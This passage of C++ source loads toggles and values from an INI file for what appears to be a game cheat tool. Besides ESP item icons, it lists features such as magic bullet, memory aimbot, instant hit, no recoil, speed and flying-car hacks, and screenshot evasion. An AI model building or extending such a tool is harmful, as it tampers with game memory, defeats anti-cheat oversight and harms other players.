	Setting::Esp_Item_Bag2 = ini.GetBoolValue("Bag 2", "key1", Setting::Esp_Item_Bag2);
	Setting::Esp_Item_Bag3 = ini.GetBoolValue("Bag 3", "key1", Setting::Esp_Item_Bag3);
	Setting::Esp_Item_Helmet1 = ini.GetBoolValue("Helmet 1", "key2", Setting::Esp_Item_Helmet1);
	Setting::Esp_Item_Helmet2 = ini.GetBoolValue("Helmet 2", "key3", Setting::Esp_Item_Helmet2);
	Setting::Esp_Item_Helmet3 = ini.GetBoolValue("Helmet 3", "key3", Setting::Esp_Item_Helmet3);
	Setting::Esp_Item_Armor1 = ini.GetBoolValue("Armor 1", "key4", Setting::Esp_Item_Armor1);
	Setting::Esp_Item_Armor2 = ini.GetBoolValue("Armor 2", "key5", Setting::Esp_Item_Armor2);
	Setting::Esp_Item_Armor3 = ini.GetBoolValue("Armor 3", "key5", Setting::Esp_Item_Armor3);
	///Health
	Setting::healthitem = ini.GetBoolValue("Health", "key0", Setting::healthitem);
	//
	Setting::Esp_Item_Bandage = ini.GetBoolValue("Bandage", "key0", Setting::Esp_Item_Bandage);
	Setting::Esp_Item_MedKit = ini.GetBoolValue("MedKit", "key0", Setting::Esp_Item_MedKit);
	Setting::Esp_Item_FirstAidKit = ini.GetBoolValue("FirstAidKit", "key1", Setting::Esp_Item_FirstAidKit);
	Setting::Esp_Item_Painkiller = ini.GetBoolValue("Painkiller", "key2", Setting::Esp_Item_Painkiller);
	Setting::Esp_Item_EnergyDrink = ini.GetBoolValue("EnergyDrink", "key3", Setting::Esp_Item_EnergyDrink);
	Setting::Esp_Item_AdrenalineSyringe = ini.GetBoolValue("AdrenalineSyringe", "key4", Setting::Esp_Item_AdrenalineSyringe);
	///Melee
	//
	Setting::Esp_Item_Pan = ini.GetBoolValue("Pan", "key3", Setting::Esp_Item_Pan);
	Setting::Esp_Item_Cowbar = ini.GetBoolValue("Cowbar", "key3", Setting::Esp_Item_Cowbar);
	Setting::Esp_Item_Machete = ini.GetBoolValue("Machete", "key3", Setting::Esp_Item_Machete);
	Setting::Esp_Item_Sickle = ini.GetBoolValue("Sickle", "key3", Setting::Esp_Item_Sickle);
	///Grenades
	//
	Setting::Esp_Item_Frag = ini.GetBoolValue("Frag", "key0", Setting::Esp_Item_Frag);
	Setting::Esp_Item_Smoke = ini.GetBoolValue("Smoke", "key1", Setting::Esp_Item_Smoke);
	Setting::Esp_Item_Molotof = ini.GetBoolValue("Molotof", "key2", Setting::Esp_Item_Molotof);
	Setting::Esp_Item_Football_Grenade = ini.GetBoolValue("Football Grenade", "key2", Setting::Esp_Item_Football_Grenade);
	Setting::Esp_Item_Grenade_Apple = ini.GetBoolValue("Apple", "key0", Setting::Esp_Item_Grenade_Apple);
	Setting::Esp_Item_AirAttack = ini.GetBoolValue("RedZone", "key0", Setting::Esp_Item_AirAttack);
	///Air&Loot
	//
	Setting::Esp_Item_AirDrop = ini.GetBoolValue("AirDrop", "key3", Setting::Esp_Item_AirDrop);
	Setting::Esp_Item_DeadBox = ini.GetBoolValue("Dead Box", "key3", Setting::Esp_Item_DeadBox);
	Setting::Esp_Item_WorldCup_Box = ini.GetBoolValue("WorldCup Box", "key3", Setting::Esp_Item_WorldCup_Box);
	Setting::vahicle_Text_item_Plane = ini.GetBoolValue("Plane", "key3", Setting::vahicle_Text_item_Plane);
	///Suits
	//
	Setting::Esp_Item_Suit_Arctic = ini.GetBoolValue("Suit - Arctic", "key3", Setting::Esp_Item_Suit_Arctic);
	Setting::Esp_Item_Suit_Desert = ini.GetBoolValue("Suit - Desert", "key3", Setting::Esp_Item_Suit_Desert);
	Setting::Esp_Item_Suit_Desert2 = ini.GetBoolValue("Suit - Desert 2", "key3", Setting::Esp_Item_Suit_Desert2);
	Setting::Esp_Item_Suit_Woodland = ini.GetBoolValue("Suit - Woodland", "key3", Setting::Esp_Item_Suit_Woodland);
	///Attachments
	//
	Setting::Esp_Item_Benzin = ini.GetBoolValue("Benzin", "key0", Setting::Esp_Item_Benzin);
	Setting::Esp_Item_Large_FlashHider = ini.GetBoolValue("AR_FlashHider", "key0", Setting::Esp_Item_Large_FlashHider);
	Setting::Esp_Item_Large_Compensator = ini.GetBoolValue("AR_Compensator", "key0", Setting::Esp_Item_Large_Compensator);
	Setting::Esp_Item_Large_Suppressor = ini.GetBoolValue("AR_Suppressor", "key0", Setting::Esp_Item_Large_Suppressor);
	Setting::Esp_Item_Vertical = ini.GetBoolValue("AR_Vertical", "key0", Setting::Esp_Item_Vertical);
	Setting::Esp_Item_HalfGrip = ini.GetBoolValue("AR_HalfGrip", "key0", Setting::Esp_Item_HalfGrip);
	Setting::Esp_Item_LightGrip = ini.GetBoolValue("AR_LightGrip", "key0", Setting::Esp_Item_LightGrip);
	Setting::Esp_Item_Angled = ini.GetBoolValue("AR_Angled", "key0", Setting::Esp_Item_Angled);
	Setting::Esp_Item_Lasersight = ini.GetBoolValue("AR_Lasersight", "key0", Setting::Esp_Item_Lasersight);
	Setting::Esp_Item_ThumbGrip = ini.GetBoolValue("AR_ThumbGrip", "key0", Setting::Esp_Item_ThumbGrip);
	Setting::Esp_Item_AR_Quick = ini.GetBoolValue("AR_Quick", "key0", Setting::Esp_Item_AR_Quick);
	Setting::Esp_Item_AR_Quick_Extended = ini.GetBoolValue("AR_Quick_Extended", "key0", Setting::Esp_Item_AR_Quick_Extended);
	Setting::Esp_Item_AR_Extended = ini.GetBoolValue("AR_Extended", "key0", Setting::Esp_Item_AR_Extended);
	Setting::Esp_Item_Taktik = ini.GetBoolValue("Chekpad_AR", "key0", Setting::Esp_Item_Taktik);
	Setting::Esp_Item_Sniper_FlashHider = ini.GetBoolValue("Sniper_FlashHider", "key0", Setting::Esp_Item_Sniper_FlashHider);
	Setting::Esp_Item_Sniper_Compensator = ini.GetBoolValue("Sniper_Compensator", "key0", Setting::Esp_Item_Sniper_Compensator);
	Setting::Esp_Item_Sniper_Suppressor = ini.GetBoolValue("Sniper_Suppressor", "key0", Setting::Esp_Item_Sniper_Suppressor);
	Setting::Esp_Item_Sniper_Quick_Extended = ini.GetBoolValue("Sniper_Quick_Extended", "key0", Setting::Esp_Item_Sniper_Quick_Extended);
	Setting::Esp_Item_Sniper_Extended = ini.GetBoolValue("Sniper_Extended", "key0", Setting::Esp_Item_Sniper_Extended);
	Setting::Esp_Item_Sniper_Quick = ini.GetBoolValue("Sniper_Quick", "key0", Setting::Esp_Item_Sniper_Quick);
	Setting::Esp_Item_Chekpad_Sniper = ini.GetBoolValue("Chekpad_Sniper", "key0", Setting::Esp_Item_Chekpad_Sniper);
	Setting::Esp_Item_Mid_FlashHider = ini.GetBoolValue("SMG_FlashHider", "key0", Setting::Esp_Item_Mid_FlashHider);
	Setting::Esp_Item_Mid_Compensator = ini.GetBoolValue("SMG_Compensator", "key0", Setting::Esp_Item_Mid_Compensator);
	Setting::Esp_Item_Mid_Suppressor = ini.GetBoolValue("SMG_Suppressor", "key0", Setting::Esp_Item_Mid_Suppressor);
	Setting::Esp_Item_Micro_UZI = ini.GetBoolValue("(Micro UZI)", "key0", Setting::Esp_Item_Micro_UZI);
	Setting::Esp_Item_SMG_Quick_Extended = ini.GetBoolValue("SMG_Quick_Extended", "key0", Setting::Esp_Item_SMG_Quick_Extended);
	Setting::Esp_Item_SMG_Extended = ini.GetBoolValue("SMG_Extended", "key0", Setting::Esp_Item_SMG_Extended);
	Setting::Esp_Item_SMG_Quick = ini.GetBoolValue("SMG_Quick", "key0", Setting::Esp_Item_SMG_Quick);
	Setting::Esp_Item_CrossBow_Quick = ini.GetBoolValue("CrossBow_Quick", "key0", Setting::Esp_Item_CrossBow_Quick);
	Setting::Esp_Item_Duckbill = ini.GetBoolValue("ShotGun_DuckBill", "key0", Setting::Esp_Item_Duckbill);
	Setting::Esp_Item_Choke = ini.GetBoolValue("ShotGun_Choke", "key0", Setting::Esp_Item_Choke);
	///////////////////////////////

	//
	Setting::Esp_Item_M416_Icon = ini.GetBoolValue("M416 image", "key0", Setting::Esp_Item_M416_Icon);
	Setting::Esp_Item_AKM_Icon = ini.GetBoolValue("AKM image", "key1", Setting::Esp_Item_AKM_Icon);
	Setting::Esp_Item_SCARL_Icon = ini.GetBoolValue("SCAR-L image", "key2", Setting::Esp_Item_SCARL_Icon);
	Setting::Esp_Item_M762_Icon = ini.GetBoolValue("M762 image", "key3", Setting::Esp_Item_M762_Icon);
	Setting::Esp_Item_M16A4_Icon = ini.GetBoolValue("M16A4 image", "key3", Setting::Esp_Item_M16A4_Icon);
	Setting::Esp_Item_G36C_Icon = ini.GetBoolValue("G36C image", "key3", Setting::Esp_Item_G36C_Icon);
	Setting::Esp_Item_QBZ_Icon = ini.GetBoolValue("QBZ image", "key3", Setting::Esp_Item_QBZ_Icon);
	Setting::Esp_Item_Mk47Mutant_Icon = ini.GetBoolValue("Mk47-Mutant image", "key3", Setting::Esp_Item_Mk47Mutant_Icon);
	Setting::Esp_Item_AUG_Icon = ini.GetBoolValue("AUG image", "key3", Setting::Esp_Item_AUG_Icon);
	Setting::Esp_Item_Groza_Icon = ini.GetBoolValue("Groza image", "key3", Setting::Esp_Item_Groza_Icon);
	Setting::Esp_Item_FAMAS_Icon = ini.GetBoolValue("FAMAS image", "key3", Setting::Esp_Item_FAMAS_Icon);
	Setting::Esp_Item_AN94_Icon = ini.GetBoolValue("AN94 image", "key3", Setting::Esp_Item_AN94_Icon);
	////Other Weapons
	//
	Setting::Esp_Item_M249_Icon = ini.GetBoolValue("M249 image", "key3", Setting::Esp_Item_M249_Icon);
	Setting::Esp_Item_MG3_Icon = ini.GetBoolValue("MG3 image", "key3", Setting::Esp_Item_MG3_Icon);
	Setting::Esp_Item_DP28_Icon = ini.GetBoolValue("DP28 image", "key3", Setting::Esp_Item_DP28_Icon);
	////Snipers
	//
	Setting::Esp_Item_M24_Icon = ini.GetBoolValue("M24 image", "key3", Setting::Esp_Item_M24_Icon);
	Setting::Esp_Item_Kar98k_Icon = ini.GetBoolValue("Kar98k image", "key3", Setting::Esp_Item_Kar98k_Icon);
	Setting::Esp_Item_Mosin_Icon = ini.GetBoolValue("Mosin image", "key3", Setting::Esp_Item_Mosin_Icon);
	Setting::Esp_Item_Awm_Icon = ini.GetBoolValue("AWM image", "key3", Setting::Esp_Item_Awm_Icon);
	////SniperRifles image
	//
	Setting::Esp_Item_QBU_Icon = ini.GetBoolValue("QBU image", "key0", Setting::Esp_Item_QBU_Icon);
	Setting::Esp_Item_SLR_Icon = ini.GetBoolValue("SLR image", "key1", Setting::Esp_Item_SLR_Icon);
	Setting::Esp_Item_SKS_Icon = ini.GetBoolValue("SKS image", "key2", Setting::Esp_Item_SKS_Icon);
	Setting::Esp_Item_Mk12_Icon = ini.GetBoolValue("MK12 image", "key3", Setting::Esp_Item_Mk12_Icon);
	Setting::Esp_Item_Mini14_Icon = ini.GetBoolValue("Mini-14 image", "key3", Setting::Esp_Item_Mini14_Icon);
	Setting::Esp_Item_Mk14_Icon = ini.GetBoolValue("MK14 image", "key3", Setting::Esp_Item_Mk14_Icon);
	Setting::Esp_Item_Win94_Icon = ini.GetBoolValue("Win94 image", "key3", Setting::Esp_Item_Win94_Icon);
	Setting::Esp_Item_VSS_Icon = ini.GetBoolValue("VSS image", "key3", Setting::Esp_Item_VSS_Icon);
	////SMG image
	//
	Setting::Esp_Item_PP19_Icon = ini.GetBoolValue("PP19Bizon image", "key0", Setting::Esp_Item_PP19_Icon);
	Setting::Esp_Item_P90_Icon = ini.GetBoolValue("P90 image", "key1", Setting::Esp_Item_P90_Icon);
	Setting::Esp_Item_TommyGun_Icon = ini.GetBoolValue("Tommy Gun image", "key2", Setting::Esp_Item_TommyGun_Icon);
	Setting::Esp_Item_MP5K_Icon = ini.GetBoolValue("MP5K image", "key3", Setting::Esp_Item_MP5K_Icon);
	Setting::Esp_Item_UMP9_Icon = ini.GetBoolValue("UMP9 image", "key3", Setting::Esp_Item_UMP9_Icon);
	Setting::Esp_Item_Vector_Icon = ini.GetBoolValue("Vector image", "key3", Setting::Esp_Item_Vector_Icon);
	Setting::Esp_Item_Uzi_Icon = ini.GetBoolValue("Uzi image", "key3", Setting::Esp_Item_Uzi_Icon);
	////ShotGuns image
	//
	Setting::Esp_Item_SawedOff_Icon = ini.GetBoolValue("SawedOff image", "key0", Setting::Esp_Item_SawedOff_Icon);
	Setting::Esp_Item_S1897_Icon = ini.GetBoolValue("S1897 image", "key1", Setting::Esp_Item_S1897_Icon);
	Setting::Esp_Item_S686_Icon = ini.GetBoolValue("S686 image", "key2", Setting::Esp_Item_S686_Icon);
	Setting::Esp_Item_DBS_Icon = ini.GetBoolValue("DBS image", "key3", Setting::Esp_Item_DBS_Icon);
	Setting::Esp_Item_S12K_Icon = ini.GetBoolValue("S12K image", "key3", Setting::Esp_Item_S12K_Icon);
	Setting::Esp_Item_M1014_Icon = ini.GetBoolValue("M1014 image", "key3", Setting::Esp_Item_M1014_Icon);
	////Pistols image
	//
	Setting::Esp_Item_DesertEagle_Icon = ini.GetBoolValue("DesertEagle image", "key0", Setting::Esp_Item_DesertEagle_Icon);
	Setting::Esp_Item_P1911_Icon = ini.GetBoolValue("P1911 image", "key1", Setting::Esp_Item_P1911_Icon);
	Setting::Esp_Item_R45_Icon = ini.GetBoolValue("R45 image", "key2", Setting::Esp_Item_R45_Icon);
	Setting::Esp_Item_P18C_Icon = ini.GetBoolValue("P18C image", "key3", Setting::Esp_Item_P18C_Icon);
	Setting::Esp_Item_P92_Icon = ini.GetBoolValue("P92 image", "key3", Setting::Esp_Item_P92_Icon);
	Setting::Esp_Item_Vz61_Icon = ini.GetBoolValue("Vz61 image", "key3", Setting::Esp_Item_Vz61_Icon);
	Setting::Esp_Item_R1895_Icon = ini.GetBoolValue("R1895 image", "key3", Setting::Esp_Item_R1895_Icon);
	Setting::Esp_Item_FlareGun_Icon = ini.GetBoolValue("Flaregun image", "key3", Setting::Esp_Item_FlareGun_Icon);
	////Scopes
	//
	Setting::Esp_Item_Holo_Icon = ini.GetBoolValue("Holo image", "key0", Setting::Esp_Item_Holo_Icon);
	Setting::Esp_Item_Lazer_Icon = ini.GetBoolValue("Lazer image", "key1", Setting::Esp_Item_Lazer_Icon);
	Setting::Esp_Item_x2_Icon = ini.GetBoolValue("x2 image", "key2", Setting::Esp_Item_x2_Icon);
	Setting::Esp_Item_x3_Icon = ini.GetBoolValue("x3 image", "key2", Setting::Esp_Item_x3_Icon);
	Setting::Esp_Item_x4_Icon = ini.GetBoolValue("x4 image", "key2", Setting::Esp_Item_x4_Icon);
	Setting::Esp_Item_x6_Icon = ini.GetBoolValue("x6 image", "key2", Setting::Esp_Item_x6_Icon);
	Setting::Esp_Item_x8_Icon = ini.GetBoolValue("x8 image", "key2", Setting::Esp_Item_x8_Icon);
	////Ammo
	//
	Setting::Esp_Item_762mm_Icon = ini.GetBoolValue("7.62mm image", "key0", Setting::Esp_Item_762mm_Icon);
	Setting::Esp_Item_556mm_Icon = ini.GetBoolValue("5.56mm image", "key1", Setting::Esp_Item_556mm_Icon);
	Setting::Esp_Item_9mm_Icon = ini.GetBoolValue("9mm image", "key2", Setting::Esp_Item_9mm_Icon);
	Setting::Esp_Item_45ACP_Icon = ini.GetBoolValue("45ACP image", "key2", Setting::Esp_Item_45ACP_Icon);
	Setting::Esp_Item_300Magnum_Icon = ini.GetBoolValue("AWM Ammo image", "key2", Setting::Esp_Item_300Magnum_Icon);
	Setting::Esp_Item_Flare_Icon = ini.GetBoolValue("Flare Ammo image", "key2", Setting::Esp_Item_Flare_Icon);
	Setting::Esp_Item_12Guage_Icon = ini.GetBoolValue("12Guage image", "key2", Setting::Esp_Item_12Guage_Icon);
	Setting::Esp_Item_Ammo_Bolt_Icon = ini.GetBoolValue("CrossBow Ammo image", "key2", Setting::Esp_Item_Ammo_Bolt_Icon);

	///Armors
	//
	Setting::Esp_Item_Bag1_Icon = ini.GetBoolValue("Bag 1 image", "key0", Setting::Esp_Item_Bag1_Icon);
	Setting::Esp_Item_Bag2_Icon = ini.GetBoolValue("Bag 2 image", "key1", Setting::Esp_Item_Bag2_Icon);
	Setting::Esp_Item_Bag3_Icon = ini.GetBoolValue("Bag 3 image", "key1", Setting::Esp_Item_Bag3_Icon);
	Setting::Esp_Item_Helmet1_Icon = ini.GetBoolValue("Helmet 1 image", "key2", Setting::Esp_Item_Helmet1_Icon);
	Setting::Esp_Item_Helmet2_Icon = ini.GetBoolValue("Helmet 2 image", "key3", Setting::Esp_Item_Helmet2_Icon);
	Setting::Esp_Item_Helmet3_Icon = ini.GetBoolValue("Helmet 3 image", "key3", Setting::Esp_Item_Helmet3_Icon);
	Setting::Esp_Item_Armor1_Icon = ini.GetBoolValue("Armor 1 image", "key4", Setting::Esp_Item_Armor1_Icon);
	Setting::Esp_Item_Armor2_Icon = ini.GetBoolValue("Armor 2 image", "key5", Setting::Esp_Item_Armor2_Icon);
	Setting::Esp_Item_Armor3_Icon = ini.GetBoolValue("Armor 3 image", "key5", Setting::Esp_Item_Armor3_Icon);
	///Health
	//
	Setting::Esp_Item_Bandage_Icon = ini.GetBoolValue("Bandage image", "key0", Setting::Esp_Item_Bandage_Icon);
	Setting::Esp_Item_MedKit_Icon = ini.GetBoolValue("MedKit image", "key0", Setting::Esp_Item_MedKit_Icon);
	Setting::Esp_Item_FirstAidKit_Icon = ini.GetBoolValue("FirstAidKit image", "key1", Setting::Esp_Item_FirstAidKit_Icon);
	Setting::Esp_Item_Painkiller_Icon = ini.GetBoolValue("Painkiller image", "key2", Setting::Esp_Item_Painkiller_Icon);
	Setting::Esp_Item_EnergyDrink_Icon = ini.GetBoolValue("EnergyDrink image", "key3", Setting::Esp_Item_EnergyDrink_Icon);
	Setting::Esp_Item_AdrenalineSyringe_Icon = ini.GetBoolValue("AdrenalineSyringe image", "key4", Setting::Esp_Item_AdrenalineSyringe_Icon);
	///Melee
	//
	Setting::Esp_Item_Pan_Icon = ini.GetBoolValue("Pan image", "key3", Setting::Esp_Item_Pan_Icon);
	Setting::Esp_Item_Cowbar_Icon = ini.GetBoolValue("Cowbar image", "key3", Setting::Esp_Item_Cowbar_Icon);
	Setting::Esp_Item_Machete_Icon = ini.GetBoolValue("Machete image", "key3", Setting::Esp_Item_Machete_Icon);
	Setting::Esp_Item_Sickle_Icon = ini.GetBoolValue("Sickle image", "key3", Setting::Esp_Item_Sickle_Icon);
	///Grenades
	//
	Setting::Esp_Item_Frag_Icon = ini.GetBoolValue("Frag image", "key0", Setting::Esp_Item_Frag_Icon);
	Setting::Esp_Item_Smoke_Icon = ini.GetBoolValue("Smoke image", "key1", Setting::Esp_Item_Smoke_Icon);
	Setting::Esp_Item_Molotof_Icon = ini.GetBoolValue("Molotof image", "key2", Setting::Esp_Item_Molotof_Icon);
	Setting::Esp_Item_Grenade_Apple_Icon = ini.GetBoolValue("Apple image", "key0", Setting::Esp_Item_Grenade_Apple_Icon);
	///Air&Loot
	//
	Setting::Esp_Item_AirDrop_Icon = ini.GetBoolValue("AirDrop image", "key3", Setting::Esp_Item_AirDrop_Icon);
	Setting::Esp_Item_DeadBox_Icon = ini.GetBoolValue("Dead Box image", "key3", Setting::Esp_Item_DeadBox_Icon);
	Setting::Esp_Item_WorldCup_Box_Icon = ini.GetBoolValue("WorldCup Box image", "key3", Setting::Esp_Item_WorldCup_Box_Icon);
	///Suits
	//
	Setting::Esp_Item_Suit_Arctic_Icon = ini.GetBoolValue("Suit - Arctic image", "key3", Setting::Esp_Item_Suit_Arctic_Icon);
	Setting::Esp_Item_Suit_Desert_Icon = ini.GetBoolValue("Suit - Desert image", "key3", Setting::Esp_Item_Suit_Desert_Icon);
	Setting::Esp_Item_Suit_Desert2_Icon = ini.GetBoolValue("Suit - Desert 2 image", "key3", Setting::Esp_Item_Suit_Desert2_Icon);
	Setting::Esp_Item_Suit_Woodland_Icon = ini.GetBoolValue("Suit - Woodland image", "key3", Setting::Esp_Item_Suit_Woodland_Icon);

	//
	Setting::Esp_Item_Benzin_Icon = ini.GetBoolValue("Benzin image", "key0", Setting::Esp_Item_Benzin_Icon);
	Setting::Esp_Item_Large_FlashHider_Icon = ini.GetBoolValue("AR_FlashHider image", "key0", Setting::Esp_Item_Large_FlashHider_Icon);
	Setting::Esp_Item_Large_Compensator_Icon = ini.GetBoolValue("AR_Compensator image", "key0", Setting::Esp_Item_Large_Compensator_Icon);
	Setting::Esp_Item_Large_Suppressor_Icon = ini.GetBoolValue("AR_Suppressor image", "key0", Setting::Esp_Item_Large_Suppressor_Icon);
	Setting::Esp_Item_Vertical_Icon = ini.GetBoolValue("AR_Vertical image", "key0", Setting::Esp_Item_Vertical_Icon);
	Setting::Esp_Item_HalfGrip_Icon = ini.GetBoolValue("AR_HalfGrip image", "key0", Setting::Esp_Item_HalfGrip_Icon);
	Setting::Esp_Item_LightGrip_Icon = ini.GetBoolValue("AR_LightGrip image", "key0", Setting::Esp_Item_LightGrip_Icon);
	Setting::Esp_Item_Angled_Icon = ini.GetBoolValue("AR_Angled image", "key0", Setting::Esp_Item_Angled_Icon);
	Setting::Esp_Item_Lasersight_Icon = ini.GetBoolValue("AR_Lasersight image", "key0", Setting::Esp_Item_Lasersight_Icon);
	Setting::Esp_Item_ThumbGrip_Icon = ini.GetBoolValue("AR_ThumbGrip image", "key0", Setting::Esp_Item_ThumbGrip_Icon);
	Setting::Esp_Item_AR_Quick_Icon = ini.GetBoolValue("AR_Quick image", "key0", Setting::Esp_Item_AR_Quick_Icon);
	Setting::Esp_Item_AR_Quick_Extended_Icon = ini.GetBoolValue("AR_Quick_Extended image", "key0", Setting::Esp_Item_AR_Quick_Extended_Icon);
	Setting::Esp_Item_AR_Extended_Icon = ini.GetBoolValue("AR_Extended image", "key0", Setting::Esp_Item_AR_Extended_Icon);
	Setting::Esp_Item_Taktik_Icon = ini.GetBoolValue("Chekpad_AR image", "key0", Setting::Esp_Item_Taktik_Icon);
	Setting::Esp_Item_Sniper_FlashHider_Icon = ini.GetBoolValue("Sniper_FlashHider image", "key0", Setting::Esp_Item_Sniper_FlashHider_Icon);
	Setting::Esp_Item_Sniper_Compensator_Icon = ini.GetBoolValue("Sniper_Compensator image", "key0", Setting::Esp_Item_Sniper_Compensator_Icon);
	Setting::Esp_Item_Sniper_Suppressor_Icon = ini.GetBoolValue("Sniper_Suppressor image", "key0", Setting::Esp_Item_Sniper_Suppressor_Icon);
	Setting::Esp_Item_Sniper_Quick_Extended_Icon = ini.GetBoolValue("Sniper_Quick_Extended image", "key0", Setting::Esp_Item_Sniper_Quick_Extended_Icon);
	Setting::Esp_Item_Sniper_Extended_Icon = ini.GetBoolValue("Sniper_Extended image", "key0", Setting::Esp_Item_Sniper_Extended_Icon);
	Setting::Esp_Item_Sniper_Quick_Icon = ini.GetBoolValue("Sniper_Quick image", "key0", Setting::Esp_Item_Sniper_Quick_Icon);
	Setting::Esp_Item_Chekpad_Sniper_Icon = ini.GetBoolValue("Chekpad_Sniper image", "key0", Setting::Esp_Item_Chekpad_Sniper_Icon);
	Setting::Esp_Item_Mid_FlashHider_Icon = ini.GetBoolValue("SMG_FlashHider image", "key0", Setting::Esp_Item_Mid_FlashHider_Icon);
	Setting::Esp_Item_Mid_Compensator_Icon = ini.GetBoolValue("SMG_Compensator image", "key0", Setting::Esp_Item_Mid_Compensator_Icon);
	Setting::Esp_Item_Mid_Suppressor_Icon = ini.GetBoolValue("SMG_Suppressor image", "key0", Setting::Esp_Item_Mid_Suppressor_Icon);
	Setting::Esp_Item_Micro_UZI_Icon = ini.GetBoolValue("(Micro UZI) image", "key0", Setting::Esp_Item_Micro_UZI_Icon);
	Setting::Esp_Item_SMG_Quick_Extended_Icon = ini.GetBoolValue("SMG_Quick_Extended image", "key0", Setting::Esp_Item_SMG_Quick_Extended_Icon);
	Setting::Esp_Item_SMG_Extended_Icon = ini.GetBoolValue("SMG_Extended image", "key0", Setting::Esp_Item_SMG_Extended_Icon);
	Setting::Esp_Item_SMG_Quick_Icon = ini.GetBoolValue("SMG_Quick image", "key0", Setting::Esp_Item_SMG_Quick_Icon);
	Setting::Esp_Item_CrossBow_Quick_Icon = ini.GetBoolValue("CrossBow_Quick image", "key0", Setting::Esp_Item_CrossBow_Quick_Icon);
	Setting::Esp_Item_Duckbill_Icon = ini.GetBoolValue("ShotGun_DuckBill image", "key0", Setting::Esp_Item_Duckbill_Icon);
	Setting::Esp_Item_Choke_Icon = ini.GetBoolValue("ShotGun_Choke image", "key0", Setting::Esp_Item_Choke_Icon);

	///////////


	//Safe MEMORY
	Setting::MagicBullet = ini.GetBoolValue("Tracking Bullet", "Enabled", Setting::MagicBullet);
	Setting::curraim = ini.GetLongValue("Aim Positon", "key0", Setting::curraim);
	Setting::magicv = ini.GetLongValue("Tracking Power", "Value", Setting::magicv); //For Writing Values

	Setting::MagicBulletticked = ini.GetBoolValue("Bullet Tracking Range", "Enabled", Setting::MagicBulletticked);
	Setting::magicrange = ini.GetLongValue("Tracking Range", "Value", Setting::magicrange); //For Writing Values
	Setting::HaxVershion = ini.GetLongValue("HaxVershion", "Value", Setting::HaxVershion); //For Writing Values
	MAgiclinee = ini.GetLongValue("MAgiclinee", "Value", MAgiclinee); //For Writing Values
	aimwarning = ini.GetLongValue("aimwarning", "Value", aimwarning); //For Writing Values

	Setting::fovcircle = ini.GetBoolValue("FOV BASED TRACKING", "key1", Setting::fovcircle);
	Setting::fovcircleredus = ini.GetLongValue("FOV Size", "Value", Setting::fovcircleredus); //For Writing Values

	Setting::Legitrack = ini.GetBoolValue("Legit Tracking", "Enabled", Setting::Legitrack); //For Writing Bool
	Setting::knocked = ini.GetBoolValue("Skip Knocked", "Enabled", Setting::knocked); //For Writing Bool
	Setting::SkipBots = ini.GetBoolValue("Skip Bots", "Enabled", Setting::SkipBots); //For Writing Bool

	Setting::ShowDamage = ini.GetBoolValue("Show Damage", "Enabled", Setting::ShowDamage); //For Writing Bool

	Setting::IpadView = ini.GetBoolValue("IPad View", "Enabled", Setting::IpadView); //For Writing Bool
	Setting::IpadViewValue = ini.GetLongValue("IPad View Value", "Value", Setting::IpadViewValue); //For Writing Values

	Setting::XEffect = ini.GetBoolValue("X Effect", "Enabled", Setting::XEffect); //For Writing Bool
	Setting::MagicX = ini.GetBoolValue("X Effect RGB", "Enabled", Setting::MagicX); //For Writing Bool
	Setting::crossHairrandom = ini.GetBoolValue("Random Cross Hair", "Enabled", Setting::crossHairrandom); //For Writing Bool
	Setting::XEffectRandomHead = ini.GetBoolValue("Random Head", "Enabled", Setting::XEffectRandomHead); //For Writing Bool
	Setting::XEffectRandomBody = ini.GetBoolValue("Random Body", "Enabled", Setting::XEffectRandomBody); //For Writing Bool

	Setting::AntiScreenShot = ini.GetBoolValue("Anti Screen", "Enabled", Setting::AntiScreenShot); //For Writing Bool
	Setting::wwcd = ini.GetBoolValue("wwcd", "Enabled", Setting::wwcd); //For Writing Bool

	//Danger MEMORY
	Setting::instanthit = ini.GetBoolValue("Instant Hit", "Enabled", Setting::instanthit); //For Writing Bool
	Setting::instantv = ini.GetLongValue("Instant Hit Value", "Value", Setting::instantv); //For Writing Values



	Setting::RapidFireG = ini.GetBoolValue("Fast Fire", "Enabled", Setting::RapidFireG); //For Writing Bool

	Setting::Magic360deg = ini.GetBoolValue("Power Magic", "Enabled", Setting::Magic360deg); //For Writing Bool
	Setting::CameraCatch = ini.GetBoolValue("Memory Aimbot", "Enabled", Setting::CameraCatch); //For Writing Bool

	Setting::fastrun = ini.GetBoolValue("Fast Run", "Enabled", Setting::fastrun);
	Setting::fastrv = ini.GetLongValue("Fast Run Value", "Value", Setting::fastrv);
	Setting::fastrunkey = ini.GetLongValue("Fast Run key", "Value", Setting::fastrunkey);

	Setting::recoil = ini.GetBoolValue("No Recoil", "Enabled", Setting::recoil); //For Writing Bool


	Setting::carfly = ini.GetBoolValue("Fly Car", "Enabled", Setting::carfly); //For Writing Bool
	Setting::flycarv = ini.GetLongValue("Fly Car Value", "Value", Setting::flycarv);

	Setting::speedcar = ini.GetBoolValue("Fast Car", "Enabled", Setting::speedcar); //For Writing Bool
	Setting::carsv = ini.GetLongValue("Speed Car Value", "Value", Setting::carsv);
	Setting::Fastcarkey = ini.GetLongValue("Speed Car [Forward] Key", "Value", Setting::Fastcarkey);
	Setting::Backcarkey = ini.GetLongValue("Speed Car [Back] Key", "Value", Setting::Backcarkey);

	Setting::CameraView = ini.GetBoolValue("Camera View", "Enabled", Setting::CameraView); //For Writing Bool
	Setting::view = ini.GetLongValue("Camera View Value", "Value", Setting::view);

	Setting::GodUp = ini.GetLongValue("GodView UP", "Value", Setting::GodUp);
	Setting::GodDown = ini.GetLongValue("GodView Down", "Value", Setting::GodDown);
	Setting::GodFront = ini.GetLongValue("GodView Front", "Value", Setting::GodFront);
	Setting::GodBack = ini.GetLongValue("GodView Back", "Value", Setting::GodBack);
	Setting::GodLeft = ini.GetLongValue("GodView Left", "Value", Setting::GodLeft);
	Setting::GodRight = ini.GetLongValue("GodView Right", "Value", Setting::GodRight);


	Setting::Quickloot = ini.GetBoolValue("Quick Loot", "Enabled", Setting::Quickloot); //For Writing Bool
	Setting::FastSwitchWeapon = ini.GetBoolValue("Fast Switch", "Enabled", Setting::FastSwitchWeapon); //For Writing Bool

	Setting::ScopeZoom = ini.GetBoolValue("Scope Zoom", "Enabled", Setting::ScopeZoom); //For Writing Bool
	Setting::scopefov = ini.GetLongValue("Scope Zoom Value", "Value", Setting::scopefov); //For Writing Values

	Setting::noSpread = ini.GetBoolValue("Small Crosshair", "Enabled", Setting::noSpread); //For Writing Bool
	Setting::ForceTPP = ini.GetBoolValue("Force TPP", "Enabled", Setting::ForceTPP); //For Writing Bool


